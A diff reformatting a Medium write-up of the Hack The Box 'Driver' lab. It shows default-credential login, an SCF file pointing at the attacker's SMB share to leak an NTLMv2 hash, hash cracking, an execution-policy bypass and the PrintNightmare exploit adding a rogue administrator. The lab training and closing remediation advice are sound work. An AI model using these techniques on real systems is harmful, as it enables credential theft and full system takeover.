@@ -1,31 +1,26 @@
-# ⚡ Zero to Root: The Ultimate Guide to Hack The Box Driver 🏆
+# ⚡ Driver
 
-\*\*Not a Member? Click here to Read Full-Story\*\*
+***
 
----
-
-### ⚡ Zero to Root: The Ultimate Guide to Hack The Box Driver 🏆
+### ⚡ Zero to Root: The Ultimate Guide to Hack The Box Driver 🏆
 
 ![](https://cdn-images-1.medium.com/max/800/1*0HpRMtV4c5em8knt-FU00A.png)
-<figcaption><strong>(Github=R00t3dbyFa17h HTB=K70n0s510 Discord&amp;HTB-CTF-Team=Iron-Breach)</strong></figcaption>
-
-<a href="https://medium.com/system-weakness/zero-to-root-the-ultimate-guide-to-hack-the-box-driver-d7f5da295946?sk=9f0035466002106c024d4ad5ac24fd56" class="markup--anchor markup--p-anchor" data-href="https://medium.com/system-weakness/zero-to-root-the-ultimate-guide-to-hack-the-box-driver-d7f5da295946?sk=9f0035466002106c024d4ad5ac24fd56" target="_blank">**Not a Member? Click here to Read Full-Story**</a>
 
 ### Executive Summary
 
-**Target:** *Driver (Hack The Box)* **OS:** *Windows* **Difficulty:** *Easy* **Attack Vectors:** *Default Credentials -\> SCF File Attack (SMB) -\> PrintNightmare (CVE-2021–1675).*
+**Target:** _Driver (Hack The Box)_ **OS:** _Windows_ **Difficulty:** _Easy_ **Attack Vectors:** _Default Credentials -> SCF File Attack (SMB) -> PrintNightmare (CVE-2021–1675)._
 
 This assessment targeted “Driver,” a Windows-based machine acting as a print server. The initial foothold was gained by leveraging weak default credentials on the exposed “MFP Firmware Update Center” web interface. This access allowed for the upload of a malicious **SCF** file, triggering an authentication attempt back to the attacker’s machine and leaking the **NTLMv2** password hash for the user **`tony`**.
 
-Lateral movement was achieved by cracking the captured hash and logging in via Windows Remote Management **(WinRM)**. Finally, System privilege escalation was accomplished by exploiting the ***“PrintNightmare”*** vulnerability ***(CVE-2021–1675)*** in the Windows Print Spooler service, allowing the creation of a rogue administrator account.
+Lateral movement was achieved by cracking the captured hash and logging in via Windows Remote Management **(WinRM)**. Finally, System privilege escalation was accomplished by exploiting the _**“PrintNightmare”**_ vulnerability _**(CVE-2021–1675)**_ in the Windows Print Spooler service, allowing the creation of a rogue administrator account.
 
-### 1.0 Initial Foothold
+### 1.0 Initial Foothold
 
 #### 1.1 Reconnaissance & Enumeration
 
 **1.1.1 Nmap Scan Analysis**
 
-- <span id="638b">The assessment began with a full TCP port scan using Nmap to identify all open services and gather version information on the target **`10.10.11.106`**.</span>
+* The assessment began with a full TCP port scan using Nmap to identify all open services and gather version information on the target **`10.10.11.106`**.
 
 ```
 ──(nicholas㉿Nicholas)-[~/HTB/Labs/Driver]
@@ -161,11 +156,11 @@ Nmap done: 1 IP address (1 host up) scanned in 87.10 seconds
            Raw packets sent: 2088 (95.556KB) | Rcvd: 39 (2.408KB)
 ```
 
-#### 1.2 Key Findings
+#### 1.2 Key Findings
 
-- <span id="4f92">**Port 80 (HTTP):** Web server prompting for Basic Auth (MFP Firmware Update Center).</span>
-- <span id="e757">**Port 445 (SMB):** Windows File Sharing enabled.</span>
-- <span id="7e44">**Port 5985 (WinRM):** Windows Remote Management is exposed, suggesting potential for remote shell access if credentials are found.</span>
+* **Port 80 (HTTP):** Web server prompting for Basic Auth (MFP Firmware Update Center).
+* **Port 445 (SMB):** Windows File Sharing enabled.
+* **Port 5985 (WinRM):** Windows Remote Management is exposed, suggesting potential for remote shell access if credentials are found.
 
 #### 1.3 Web Application Enumeration
 
@@ -173,27 +168,27 @@ Nmap done: 1 IP address (1 host up) scanned in 87.10 seconds
 
 **1.3.2 Vulnerability Discovery:** We attempted standard default credentials.
 
-- <span id="cf60">**Username:Password** **`admin:admin`**</span>
+* **Username:Password** **`admin:admin`**
 
 ![](https://cdn-images-1.medium.com/max/800/1*K3kM9WHZOOGq-1MjNOy7jQ.png)
 
-- <span id="169f">**Result:** Successful login.</span>
+* **Result:** Successful login.
 
 ![](https://cdn-images-1.medium.com/max/800/1*onnFxWeUDtG7-uUU0tMnEQ.png)
 
 **1.3.3 Feature Abuse:** Inside the dashboard, a “Firmware Updates” tab allowed for file uploads. Since the server processes these files, this feature is a candidate for forced authentication attacks.
 
-### 2.0 Initial Shell
+### 2.0 Initial Shell
 
-#### 2.1 Exploitation (SCF File Attack)
+#### 2.1 Exploitation (SCF File Attack)
 
 **2.1.1 The Exploit**
 
-- <span id="3810">The server allows users to upload files which are likely stored on a share accessed by the system. By uploading a malicious **`.scf`** (Shell Command File), we can abuse the Windows Explorer icon rendering behavior. The file directs the system to look for an icon at a remote SMB share (our attacking machine), forcing the server to send its NTLMv2 hash to us.</span>
+* The server allows users to upload files which are likely stored on a share accessed by the system. By uploading a malicious **`.scf`** (Shell Command File), we can abuse the Windows Explorer icon rendering behavior. The file directs the system to look for an icon at a remote SMB share (our attacking machine), forcing the server to send its NTLMv2 hash to us.
 
 **2.1.2 Tool Setup**
 
-- <span id="cba1">We configured **`Responder`** on the attack box to listen on the **`tun0`** interface for incoming SMB connections.</span>
+* We configured **`Responder`** on the attack box to listen on the **`tun0`** interface for incoming SMB connections.
 
 ```
 sudo responder -I tun0
@@ -201,7 +196,7 @@ sudo responder -I tun0
 
 **2.1.3 Execution**
 
-- <span id="0ca4">We created a malicious file named **`shell.scf`**.</span>
+* We created a malicious file named **`shell.scf`**.
 
 **File Content (`shell.scf`):**
 
@@ -213,7 +208,7 @@ IconFile=\\10.10.14.19\test.ico
 Command=ToggleDesktop
 ```
 
-*(Note:* ***`10.10.14.19`*** *was our specific* ***`tun0`*** *IP address for this session).*
+_(Note:_ _**`10.10.14.19`**_ _was our specific_ _**`tun0`**_ _IP address for this session)._
 
 We navigated to the “Firmware Updates” page on the web dashboard and uploaded this file.
 
@@ -231,7 +226,7 @@ We navigated to the “Firmware Updates” page on the web dashboard and uploade
 
 **2.2.1 Cracking the Hash**
 
-- <span id="4ab0">We saved the full hash string to a file named **`tony.hash`**. Using **`hashcat`** with mode **`5600`** (NetNTLMv2), we cracked the hash against the **`rockyou.txt`** wordlist.</span>
+* We saved the full hash string to a file named **`tony.hash`**. Using **`hashcat`** with mode **`5600`** (NetNTLMv2), we cracked the hash against the **`rockyou.txt`** wordlist.
 
 ```
 hashcat -m 5600 tony.hash /usr/share/wordlists/rockyou.txt
@@ -241,7 +236,7 @@ hashcat -m 5600 tony.hash /usr/share/wordlists/rockyou.txt
 
 **2.2.2 Access**
 
-- <span id="00ae">Since our initial Nmap scan identified that Port 5985 (WinRM) was open, we used **`evil-winrm`** to log in directly using the cracked credentials.</span>
+* Since our initial Nmap scan identified that Port 5985 (WinRM) was open, we used **`evil-winrm`** to log in directly using the cracked credentials.
 
 ```
 evil-winrm -i driver.htb -u tony -p liltony
@@ -262,8 +257,8 @@ cfccce5ba95bb9be7f2cd73ec6542c5d
 
 **3.1.1 Vulnerability Identification**
 
-- <span id="f068">Given the machine’s name **“Driver”** and its role as a print server, we suspected it was vulnerable to **PrintNightmare**. This vulnerability allows authenticated users to exploit the Windows Print Spooler service to load malicious drivers and execute code as **SYSTEM**.</span>
-- <span id="7032">We verified the service was active using PowerShell:</span>
+* Given the machine’s name **“Driver”** and its role as a print server, we suspected it was vulnerable to **PrintNightmare**. This vulnerability allows authenticated users to exploit the Windows Print Spooler service to load malicious drivers and execute code as **SYSTEM**.
+* We verified the service was active using PowerShell:
 
 ```
 *Evil-WinRM* PS C:\Users\tony\Documents> Get-Service Spooler
@@ -277,7 +272,7 @@ Running  Spooler            Print Spooler
 
 **3.1.2 Execution & Troubleshooting**
 
-- <span id="2300">We downloaded the exploit script (**`CVE-2021-1675.ps1`**) to our attack box and uploaded it to the target using **`evil-winrm`**.</span>
+* We downloaded the exploit script (**`CVE-2021-1675.ps1`**) to our attack box and uploaded it to the target using **`evil-winrm`**.
 
 ```
 ┌──(nicholas㉿Nicholas)-[~/HTB/Labs/Driver]
@@ -304,13 +299,13 @@ Data: 238080 bytes of 238080 bytes copied
 Info: Upload successful!
 ```
 
-- <span id="4688">When attempting to import the module, we encountered a **`PSSecurityException`** because script execution was disabled on the target. To fix this, we bypassed the execution policy for our current process:</span>
+* When attempting to import the module, we encountered a **`PSSecurityException`** because script execution was disabled on the target. To fix this, we bypassed the execution policy for our current process:
 
 ```
 *Evil-WinRM* PS C:\Users\tony\Desktop> Set-ExecutionPolicy Bypass -Scope Process
 ```
 
-- <span id="2a74">With the policy bypassed, we imported the module and fired the exploit. We targeted the spooler service to create a new local administrator named **`hacker`**.</span>
+* With the policy bypassed, we imported the module and fired the exploit. We targeted the spooler service to create a new local administrator named **`hacker`**.
 
 ```
 *Evil-WinRM* PS C:\Users\tony\Desktop> Import-Module .\CVE-2021-1675.ps1
@@ -321,13 +316,13 @@ Info: Upload successful!
 [+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
 ```
 
-***Note: The Print Spooler service on this machine is unstable. If the command hangs, terminate it with*** ***`Ctrl+C`*** ***and try again immediately. It often takes two attempts to succeed.***
+_**Note: The Print Spooler service on this machine is unstable. If the command hangs, terminate it with**_ _**`Ctrl+C`**_ _**and try again immediately. It often takes two attempts to succeed.**_
 
 **Result:** **`[+] Successfully added user 'hacker' to local group 'Administrators'`**
 
 **3.1.3 Root Access**
 
-- <span id="f41d">We verified the user was created (**`net user hacker`**) and then terminated our current session. We logged back in using the newly created administrator credentials.</span>
+* We verified the user was created (**`net user hacker`**) and then terminated our current session. We logged back in using the newly created administrator credentials.
 
 ```
 ┌──(nicholas㉿Nicholas)-[~/HTB/Labs/Driver]
@@ -343,7 +338,7 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\hacker\Documents>
 ```
 
-- <span id="44df">Once authenticated as an Administrator, we navigated to the Administrator’s desktop to retrieve the final flag.</span>
+* Once authenticated as an Administrator, we navigated to the Administrator’s desktop to retrieve the final flag.
 
 ```
 ──(nicholas㉿Nicholas)-[~/HTB/Labs/Driver]
@@ -366,27 +361,27 @@ aaa1110f0d2a9bd838d1fdd269b3d662
 
 ### 4.0 Conclusion & Remediation
 
-#### 4.1 Summary of Findings
+#### 4.1 Summary of Findings
 
 The “Driver” machine demonstrated how legacy Windows features and unpatched services can be chained together to compromise a system completely. The attack path relied on two critical failures:
 
-1.  <span id="2a24">**SCF File Upload:** The ability to upload a file that forces the operating system to initiate an outbound SMB connection.</span>
-2.  <span id="d56c">**PrintNightmare:** An unpatched vulnerability in the Windows Print Spooler service that allowed for local privilege escalation.</span>
+1. **SCF File Upload:** The ability to upload a file that forces the operating system to initiate an outbound SMB connection.
+2. **PrintNightmare:** An unpatched vulnerability in the Windows Print Spooler service that allowed for local privilege escalation.
 
 #### 4.2 Remediation Strategy
 
 To secure this system and prevent similar attacks in the future, the following steps are recommended:
 
-- <span id="a2a1">**Block Outbound SMB:** Configure the network firewall to block all outbound traffic on TCP Port 445. Servers generally do not need to initiate SMB connections to the internet or external clients.</span>
-- <span id="db7f">**Disable NTLM:** Where feasible, disable NTLM authentication and enforce Kerberos to prevent hash capture attacks.</span>
-- <span id="7040">**Patch Management:** Apply Microsoft Security Update KB5004945 (or newer) to patch the PrintNightmare vulnerability.</span>
-- <span id="d644">**Disable Print Spooler:** On servers that do not function as dedicated print servers (especially Domain Controllers), the Print Spooler service should be permanently disabled.</span>
+* **Block Outbound SMB:** Configure the network firewall to block all outbound traffic on TCP Port 445. Servers generally do not need to initiate SMB connections to the internet or external clients.
+* **Disable NTLM:** Where feasible, disable NTLM authentication and enforce Kerberos to prevent hash capture attacks.
+* **Patch Management:** Apply Microsoft Security Update KB5004945 (or newer) to patch the PrintNightmare vulnerability.
+* **Disable Print Spooler:** On servers that do not function as dedicated print servers (especially Domain Controllers), the Print Spooler service should be permanently disabled.
 
----
+***
 
-### 5.0 Rooted By Faith
+### 5.0 Rooted By Faith
 
-### *Psalm 32:8 — “I will instruct you and teach you in the way you should go; I will counsel you with my loving eye on you.”*
+### _Psalm 32:8 — “I will instruct you and teach you in the way you should go; I will counsel you with my loving eye on you.”_
 
 **Application:** The machine “Driver” was compromised because it followed a bad set of instructions — a malicious driver exploit that led to a total system takeover. The system trusted input it shouldn’t have, and it lacked the safeguards to distinguish between a legitimate update and a trap.
 
@@ -396,17 +391,17 @@ In our spiritual walk, we are often like this server. We look for “drivers”�
 
 I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.
 
-- <span id="3ac5">Is there a specific tool you wish existed?</span>
-- <span id="f8a6">Is there a hacking concept you want me to learn and explain?</span>
-- <span id="cdb8">Do you have a “brick wall” you’re hitting in your own research?</span>
+* Is there a specific tool you wish existed?
+* Is there a hacking concept you want me to learn and explain?
+* Do you have a “brick wall” you’re hitting in your own research?
 
 Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.
 
-<a href="https://discord.gg/8buAHtm2fK" class="markup--anchor markup--mixtapeEmbed-anchor" data-href="https://discord.gg/8buAHtm2fK" title="https://discord.gg/8buAHtm2fK"><strong>Join the Iron-Breach Discord Server!</strong><br />
-<em>An advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…</em>discord.gg</a><a href="https://discord.gg/8buAHtm2fK" class="js-mixtapeImage mixtapeImage mixtapeImage--empty u-ignoreBlock" data-media-id="9784a322b4c4322c092dbd39583df8bb"></a>
+[**Join the Iron-Breach Discord Server!**\
+_&#x41;n advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…_&#x64;iscord.gg](https://discord.gg/8buAHtm2fK)
 
-By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [December 25, 2025](https://medium.com/p/d7f5da295946).
+By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [December 25, 2025](https://medium.com/p/d7f5da295946).
 
-<a href="https://medium.com/@nicholasmullenski/zero-to-root-the-ultimate-guide-to-hack-the-box-driver-d7f5da295946" class="p-canonical">Canonical link</a>
+[Canonical link](https://medium.com/@nicholasmullenski/zero-to-root-the-ultimate-guide-to-hack-the-box-driver-d7f5da295946)
 
 Exported from [Medium](https://medium.com) on September 1, 2026.
